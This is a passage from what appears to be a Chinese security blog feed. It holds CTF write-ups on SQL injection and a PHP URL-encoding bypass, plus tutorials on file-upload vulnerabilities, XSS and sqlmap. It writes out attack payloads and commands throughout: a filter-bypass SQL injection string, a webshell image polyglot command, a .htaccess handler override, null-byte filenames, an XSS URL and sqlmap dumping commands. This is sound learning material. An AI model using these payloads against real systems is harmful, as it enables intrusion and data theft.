class="language-none">&#39;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;password&#x2F;**&#x2F;WITH&#x2F;**&#x2F;ROLLUP&#x2F;**&#x2F;LIMIT&#x2F;**&#x2F;1&#x2F;**&#x2F;OFFSET&#x2F;**&#x2F;1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>offset后面的值需要尝试才能找到pwd是null的行,但这道题直接就匹配到了，就这样了。</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="/images/image-20201118121613857.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token keyword">function</span> <span class="token function-definition function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">#session</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"error"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是给出的代码，看起来和web10很像，但其实这里使用session来判断密码是否相同，session中的password储存在本地的，所以只要删除cookie中的密码，并输入面为空，再登录就可以得到flag了</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PHP2_wp</title>
      <link href="/2020/11/02/gong-fang-shi-jie-php2-wp/"/>
      <url>/2020/11/02/gong-fang-shi-jie-php2-wp/</url>
      
        <content type="html"><![CDATA[<p>此题主要考察点还是PHP代码简单审计，可以简要记录一下</p><p><img src="/images/image-20201102212152018.png"></p><p>打开界面后什么也没有，f12后也没有东西，我们尝试访问index.php.发现，<strong>还是没东西</strong>，其实到这里我用御剑扫了一下，还是没啥发现，卡住了<del>真有够菜的，hhh</del>,网上搜了一下，发现一个知识点：</p><blockquote><p>可以使用php.s尝试查看php源文件</p><p>.phps后缀释义：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">phps文件就是php的源代码文件。通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样就可以看到了这里的源代码：</p><p><img src="/images/image-20201102212554002.png"></p><p>这里可以看到如果id=name就可以输出KEY应该就能够得到想要的信息，但第一段和第二段代码中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token operator">===</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#如果成立则退出</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token comment">#成立则输出KEY</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里尝试对”===”以及”==”进行构造来绕过第一个语句但发现好像不行，这样我们注意到urldecode($_GET[id])</p><p>尝试使用url编码进行绕过，但需要我们稍微了解一下url编码解码的流程：</p><ol><li>浏览器在上传数据时，会对参数值进行一次解码（与php代码无关，是浏览器自身会解码一次）</li><li>在服务器中根据代码继续后续解码操作</li></ol><p>所以如果我们对”admin”进行一次url编码：<code>%61%64%6d%69%6e</code>(注意，很多在线url编码一般保留字符不编码，我们需要选择对所有字符都编码才能得到想要的结果)</p><p>这样执行还是会输出”not allowed”</p><p>但只要我们再url编码一次就可以了<code>%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code></p><p><code>http://220.249.52.133:59362/?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code></p><p>这样就可以输出了：</p><p><img src="/images/image-20201102214326976.png"></p><p><del>就这?就这？这我都要看hint才能做出来，web真是点开一道题就是一个新的知识点，还是学的太少了啊，(╥╯^╰╥)</del></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2020/10/19/wen-jian-shang-chuan-lou-dong/"/>
      <url>/2020/10/19/wen-jian-shang-chuan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>当文件上传点未对文件进行严格验证和过滤时容易造成任意文件上传，一些文件会导致风险，如PHP，JSP，ASP文件等，如果上传的目标目录没有限制执行权限，会导致文件上传漏洞</p><p>文件上传的必要条件：</p><blockquote><p>存在上传点</p><p>可以上传动态文件（绕过）</p><p>上传文件有执行权限，并可以执行</p><p>可以访问到上传的文件</p></blockquote><p>当文件上传使用前端检测的时候，我们通过抓包再修改即可以绕过大部分的限制，此处不表。</p><p>一般来说后端检测一般是检测的三个点</p><ol><li>文件名（扩展名）<ol><li>MIME/content type（浏览器自动生成）</li></ol></li><li>文件内容</li></ol><h3 id="MIME类型检测绕过"><a href="#MIME类型检测绕过" class="headerlink" title="MIME类型检测绕过"></a>MIME类型检测绕过</h3><p>MIME是描述消息内容类型的因特网标准</p><p>MIME消息能包含文本，图像，音频，视频以及其他应用程序专用数据</p><p>浏览器会根据上传文件扩展名自动对应到相应的MIME类型上</p><p><img src="/images/image-20201023102559754.png" alt="常见MIME TYPE白名单"></p><p>所以也是在抓包后修改content type为白名单即可</p><h3 id="文件内容检测绕过"><a href="#文件内容检测绕过" class="headerlink" title="文件内容检测绕过"></a>文件内容检测绕过</h3><ol><li><p>检测文件头</p><ol><li>文件开头一部分数据承担了一定的任务数据，具有固定格式，文件头的开头一般标记文件类型，如gif类型的文件头为GIF89a或者GIF87a</li><li>我们可以尝试在抓包或在所上传的文件中内容中加上指定的文件头格式即可完成绕过</li></ol></li><li><p>完整文件结构检测</p><ol><li>通过调用图像函数等来检测上传文件是否为预定格式，需要文件内容保持相对完整，无法通过增加头头部起始字节的方式进行绕过</li><li>针对这种检测，我们可以将图片与我们想要上传的文件进行合并来绕过检测（使用copy命令进行文件合并）</li><li>合并后的文件只要没有经过清洗或者缩放等操作即可通过检测，并保持文件上传的完整性</li><li>由于上传的图片在解析为php代码时会被解析为乱码，所以应当选择尽量小的图片（使用画板即可）进行合并,一下为一个copy命令实例：</li></ol><pre class="line-numbers language-none"><code class="language-none">copy &#x2F;b 1.jpg+aaa.php 2.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就将本目录下的1.jpg和aaa.php文件合并为了2.jpg文件</p></li><li><p>恶意文件内容检测</p><ol><li>检测上传内容中是否有webshell等数据    </li><li>需要对常见语言的webshell有一定的认知，最后能知道是拦截了什么webshell，</li><li>推荐使用kali中使用强混淆的weevely</li></ol><p><img src="/images/image-20201023112930431.png" alt="常见的恶意文件内容检测"></p><p>逐渐尝试找到被拦截的关键字</p></li><li><p>文件上传绕过小技巧：</p><ol><li>文件参数多filename属性:上传过程中，如果waf拦截了一些扩展名，我们可以尝试多个filename属性，即在上传时我们可以构造两个filename参数，因为有的wafhi只对第一个（或最后一个）进行校验，而我们最后读取到的是最后一个（或第一个）文件，这样就可以实现绕过完成上传</li><li>目录可控时可以尝试目录穿越的方法**(../)** ,有的时候我们上传文件成功后该目录下没有访问权限，比如过滤掉了php文件这种时候我们就可以尝试使用目录穿越的方法来回到上级目录，尝试是否能够将文件上传到上级目录并执行啊</li><li>具体操作为在上传时使用burp抓包，在上传文件的参数中的<strong>file</strong> 出加上/../(这是返回一级)/../../(返回两级)，这是就可以实现上传了</li><li>如果waf有过滤连续../时可以这样：/.././../  这样就可以了，因为./是本级目录的意思，这样也可以达到回到前两级目录的效果 </li></ol></li><li><p>00截断检测</p><ol><li>00截断是存在于php较低版本（5.2之前？）中的一个漏洞，当我们使用%00时，可以恶意的截断路径，因为在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</li><li>比如我们上传文件时，想要上传c.php,被黑白名单拦截，要求上传jpg格式，我们可以选择上传c.php.jpg,在抓包后将其改为c.php%00.jpg，这样上传时被当做jpg没有被拦截，但是因为有%00，所以%00后的语句被截断了，所以可以认为我们是上传了一个php文件，这样就可以拿到webshell了</li><li>在有的时候还可以用于上传文件目录中，以ctfhub中一道文件上传题目为例，需要使用两个截断，一个是将上传的一句话木马名称截断，一个是将设定的上传目录截断，以方便连接</li></ol><p><img src="/images/image-20201026200059746.png"></p></li></ol><p><img src="/images/image-20201026200924910.png"></p><p>这是这道题目给出的代码，可以看到，他会将上传的文件存储在一个该目录下的一个随机值加date下，这样我们无法找到并连接，所以我们需要将将上传的目录也进行00截断，这样后面的随机值就影响不到我们了，就可以上传一句话成功</p><ol start="6"><li><p>.htaccess文件上传</p><ol><li><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能，具体不表。</p></li><li><p>原理：上传覆盖.htaccess文件，重写解析规则，将上传的图片马以脚本方式解析</p></li><li><p>当用在文件上传中时，可以这样使用：</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;aaa.jpg&quot;&gt;ForceType application&#x2F;x-httpd-phpSetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的意思是对于文件 aaa.jpg,在调用他时将其转换为php格式进行执行，这样我们就可以上传一个aaa.jpg,其中的内容为一句话木马，这样就可以获取webshell了</p></li></ol></li></ol><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>即服务器在访问静态文件时将其解析成了动态文件导致的解析错误漏洞</p><ol><li><p>IIS/Nginx+PHP fastcgi取值错误解析漏洞（配置错误）</p><ol><li><p>开启了cgi.fix_pathinfo，如果开启后所执行文件不存在，会继续查找上一级文件是否存在。并且未设置security.limit_extensions,该选项限制可以执行的文件类型</p><p>示例： abcde.jpg/.php</p><p>在这个目录下没有找到php文件，会返回到jpg的目录下，导致jpg文件被当做php执行</p></li></ol></li><li><p>Nginx文件名逻辑漏洞（CVE-201304547)上传一个以空格（%20）结尾 文件，例如”abcd.jpg  “当访问abcd.jpg%20%00.php时，会将刚刚上传的文件当做php执行（%00,%20可能需要解码）</p></li><li><p>Apache解析漏洞（配置错误）</p><ol><li><p>apache的conf文件有如下配置：AddHandler application/x-httpd-php .php</p><p>则abcd.php.jpg会被当做php执行</p></li><li><p>如果在.htaccess中有如下配置，则可以将扩展名.xxx当做php执行：</p><p>AddType application/x-httpd-php xxx</p></li></ol></li><li><p>IIS 5.x/6.0解析漏洞</p><ol><li>上传文件名： abcd.asp;.jpg服务器默认不解析;后的内容，所以文件被当做了asp文件解析</li><li>向xxx.asp目录下上传文件都当做asp文件解析。</li></ol></li></ol><h3 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h3><h4 id="重绘图"><a href="#重绘图" class="headerlink" title="重绘图"></a>重绘图</h4><p>后端调用了图片库对上传的文件进行了图像转换，所以即使将图片和文件合并也会将尾部换掉，无法使用前面所讲的图片合并绕过，无法上传webshell</p><ol><li><p>将正常图片用目标使用的图片库进行转换，</p></li><li><p>寻找转换前后两次未变的部分，</p></li><li><p>将未变部分替换为想上传的webshell</p></li><li><p>将替换后的文件进行图像转换，看是否转换后任存在替换后部分</p><h4 id="PHPINFO与本地文件包含的利用"><a href="#PHPINFO与本地文件包含的利用" class="headerlink" title="PHPINFO与本地文件包含的利用"></a>PHPINFO与本地文件包含的利用</h4></li></ol><p>站点存在本地文件及包含phpinfo，可以利用其执行脚本</p><ol><li>PHP在解析multipart/form-data请求时，会创建临时文件，并写入上传内容，脚本执行结束或删除</li><li>phpinfo可以输出$_FILES信息</li><li>通过多种方式争取时间，在临时文件删除前进行执行包含<ol><li>在数据报文中加入大量垃圾数据，让phpinfo页面过大，导致PHP输出进入流式输出，一次不能输出完毕</li><li>通过大量请求来延迟PHP脚本的执行速度</li></ol></li></ol><h4 id="在线解压缩"><a href="#在线解压缩" class="headerlink" title="在线解压缩"></a>在线解压缩</h4><p>存在上传压缩包并解压的的上传点，可以如下利用：</p><ol><li><p>将webshell打包到压缩包中，</p><ol><li>模板上传处常用压缩包上传后进行自动解压</li><li>部分此类有检测压缩包中的内容可以尝试建立目录进行压缩</li><li>使用目录穿越（../）的方法向上一级目录进行上传</li></ol></li><li><p>上传软链接</p><ol><li>文件软链接链接到/etc/passwd等文件夹，达到任意文件读取</li><li>软链接类似windows的快捷方式</li></ol></li></ol><h3 id="一些特性"><a href="#一些特性" class="headerlink" title="一些特性"></a>一些特性</h3><p>对于windows服务器，在文件上传上有一些特性</p><ul><li>自动去除文件名后的“.”，所以可以通过上传”shell.php.”进行绕过黑名单</li><li>自动去除文件名后的空格，所以可以通过上传后抓包在最后加上空格即可绕过黑名单</li><li>windows操作系统建立文件会自动去除末尾::$DATA，所以在末尾加上::$DATA即可绕过黑名单。（php在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。）</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2020/10/09/xss/"/>
      <url>/2020/10/09/xss/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>xss，又称跨站脚本攻击，是一种网站应用程序的安全漏洞。是代码注入漏洞的一种，使用巧妙方法想网页中注入恶意代码，用户浏览器在加载网页，渲染HTML文档时恶意代码就会被执行。</p><p>一直在OWASP top 10 中出现，在CTF比赛中也很常见。</p><p>按照漏洞成因，一般分为三类</p><ul><li><p>反射型，</p></li><li><p>存储型，</p></li><li><p>DOM型</p></li></ul><p>还可以根据输出地点不同分为三类</p><ul><li>输出在 HTML代码中</li><li>输出在CSS代码中</li><li>输出在JavaScript代码中</li></ul><h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h3><p>xss代码作为客户端URL输入的内容提交给服务器，服务器解析后在相应内容中返回输入的XSS代码。最终由浏览器输出，（没有存储在服务器的数据库中，只是经过了处理被展示出来）原型如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">/</span>php<span class="token keyword">echo</span> <span class="token string single-quoted-string">'your input:'</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里是网站源码的示例，服务器接收input</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果在服务器端没有对input进行任何过滤。那攻击者在网页上提交一段代码，以input形式上传，最那echo语句会将客户端输入的代码输出到HTTP相应中，浏览器解析并执行，比如</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;aaa.com&#x2F;index.php&#x2F;?input&#x3D;&lt;script&gt;alert(hello)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就会执行这一段代码中语句，在页面上弹出”hello”的弹窗</p><p>反射型xss需要在url中有提交的参数即get型传输数据，只有这样才能通过构造出一个恶意的url，黑客对反射型xss的使用一般都是通过让用户访问带有xss攻击的url完成的。</p><p>其实这里有html的原理，就是需要标签闭合，我们在进行xss利用的时候是需要检查网页元素的，需要依照实际情况使HTML语句闭合，再插入xss代码。</p><p>一般反射型xss漏洞是在<strong>搜索</strong>栏中，也可能出现在别的get型的传输数据处，需要进行测试。</p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>存储型xss是指恶意代码上传至服务器数据库中，在正常用户访问该页面时恶意代码被取出并解析执行，导致了xss攻击。</p><p>一般我们会在<strong>发布帖子，回复帖子，编辑资料</strong>等需要将输入数据上传至服务器数据库的页面行为中发现xss漏洞，如果验证存在该漏洞后，就可以在这里插入xss代码进行攻击行为，</p><p>一般来说我们检验后端源码可以看到如下语句:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到这是从客户端post上来的数据中取出数据赋值给变量，这里没有过滤，就会导致存储型xss漏洞的存在，此时就会使用一些过滤函数来对语句进行过滤，让xss语句被过滤。具体不表。<strong>如何绕过过滤会在后续记录</strong></p><h3 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h3><p>dom型xss是指攻击者在url中插入xss代码，清单页面直接从url中获取xss代码并输出到页面，导致xss代码攻击，攻击者将带有xss代码的url发送给用户，用户打开后收到攻击，注意在dom型xss中没有经过后端，直接是通过前端的处理来执行的xss攻击，一般是使用js脚本进行执行代码，<strong>还是需要多次的实验以及验证</strong></p><p>其实很多时候反射型和dom型看似很类似，但是原理有本质上却别的，因为代码执行的地点并不相同。</p><p>dom型比较多的还是存在于搜索功能框中，找dom型可以仔细看一看网页源代码，注意script中是否会有注入点。</p><p><strong><em>所以需要有一定的前端代码知识</em></strong>。</p><h3 id="Electron-xss"><a href="#Electron-xss" class="headerlink" title="Electron xss"></a>Electron xss</h3><p>electron是一个开源的基于浏览器内核的框架，使用 JavaScript、HTML 和 CSS 构建跨平台桌面应用程序，可以调用一些底层的api，对其可以进行普通的xss攻击，但也有一些特殊的利用点，就是利用了其使用到node.js，可以通过输入框等实现命令执行，达到更大的影响</p><h3 id="postMessage-xss"><a href="#postMessage-xss" class="headerlink" title="postMessage xss"></a>postMessage xss</h3><p>postMessage是html5引入的API,是js的一种用法。postMessage()方法允许来自不同源的脚本采用异步方式进行有效的通信,可以实现跨文本文档,多窗口,跨域消息传递.多用于窗口间数据通信,这也使它成为跨域通信的一种有效的解决方案.</p><p><strong><em>\</em>window.postMessage()**</strong> 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/domain"><code>Document.domain</code></a>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全</p><p>但通过这种方法发送到信息也可能造成xss攻击，需要开发者做相应措施来规避，下面是两个案例</p><p><a href="https://www.anquanke.com/post/id/85634">https://www.anquanke.com/post/id/85634</a></p><p><a href="http://www.mottoin.com/94130.html">http://www.mottoin.com/94130.html</a></p><h3 id="localStorage-xss"><a href="#localStorage-xss" class="headerlink" title="localStorage xss"></a>localStorage xss</h3><p>只读的<code>localStorage</code> 属性允许你访问一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document"><code>Document</code></a> 源（origin）的对象 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a>；存储的数据将保存在浏览器会话中。<code>localStorage</code> 类似 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage"><code>sessionStorage</code></a>，但其区别在于：存储在 <code>localStorage</code> 的数据可以长期保留；而当页面会话结束——也就是说，当页面被关闭时，存储在 <code>sessionStorage</code> 的数据会被清除 。</p><p>应注意，无论数据存储在 <code>localStorage</code> 还是 <code>sessionStorage</code> ，它们都特定于页面的协议</p><p>一般来说如果使用来localstorage，那么有可能通过反射型xss利用localstorage来使其成为一个存储型的xss</p><h3 id="xss持久控制"><a href="#xss持久控制" class="headerlink" title="xss持久控制"></a>xss持久控制</h3><p>通过一个任意的xss，注入ServiceWorker，在浏览器后端达到持久控制的目的。service worker 是一个服务器与浏览器之间的中间人角色，如果网站中注册了service worker那么它可以拦截当前网站所有的请求，进行判断（需要编写相应的判断程序），如果需要向服务器发起请求的就转给服务器，如果可以直接使用缓存的就直接返回缓存不再转给服务器。从而大大提高浏览体验。</p><p>Service Worker常驻在浏览器中，即便注册它的页面已经关闭，Service Worker 也不会停止。本质上它是一个后台线程，只有你主动终结，或者浏览器回收，这个线程才会结束，serviceworker只能注册在https和localhost上</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'serviceWorker'</span> <span class="token keyword">in</span> window<span class="token punctuation">.</span>navigator<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  navigator<span class="token punctuation">.</span>serviceWorker<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'./zero.js'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">scope</span><span class="token operator">:</span> <span class="token string">'./'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">reg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span> reg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fail'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是serviceworker注册的代码。其中的zero.js就是判断以及控制程序，这也是实现xss的地方，而要想实现通过同源js脚本控制serviceworker，可以通过文件上传或者jsonp跨站请求实现。</p><p>利用思路：通过文件上传或者其他方法能控制文件，通过这个文件来注册servieceworker，通过serviceworker来实现xss 的持久化，可以参考：</p><p><a href="http://zerobs.top/2020/11/15/71.html">http://zerobs.top/2020/11/15/71.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/2020/10/06/sqlmap-shi-yong/"/>
      <url>/2020/10/06/sqlmap-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>sqlmap是一款开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>同时它也支持五种注入模式：</p><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>联合查询注入，可以使用 union 的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><p>支持多种数据库</p><p>sqlmap支持的数据库有</p><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><p>很多时候使用sqlmap会使得sql注入变得更加的简单，高效，</p><h3 id="使用初阶"><a href="#使用初阶" class="headerlink" title="使用初阶"></a>使用初阶</h3><p><strong>本篇博客基于windows环境进行操作</strong></p><p>在安装sqlmap的文件夹下打开命令行，使用命令 </p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;220.249.52.133:43929&#x2F;?inject&#x3D;1&quot; -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><em>这里的-v 3是输出等级，3代表显示注入时使用的payload，便于加深理解</em></strong></p><ol start="2"><li>在检测出报错点后继续添加语句来爆库名</li></ol><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;220.249.52.133:43929&#x2F;?inject&#x3D;1&quot; --dbs -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>在得到库名后对指定库进行表查询：</li></ol><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &#39;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; -D security --tables -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>得到表名后查表中单列</li></ol><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &#39;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; -D security -T users --columns -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>得到列后获取数据即可</li></ol><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &#39;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; -D security -T users -C username --dump -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有一个小技巧，SQLMap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;admin&#x2F;1&#x2F;&#96; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的： &#96;&#x2F;admin.php?id&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可.</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u &quot;www.baidu.com&#x2F;admin&#x2F;1*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想要进阶使用sqlmap就需要熟练掌握其参数配置以及tamper脚本的编写使用：</p><p><img src="/images/image-20210814094243025.png"></p><p><img src="/images/image-20210814095219713.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入</title>
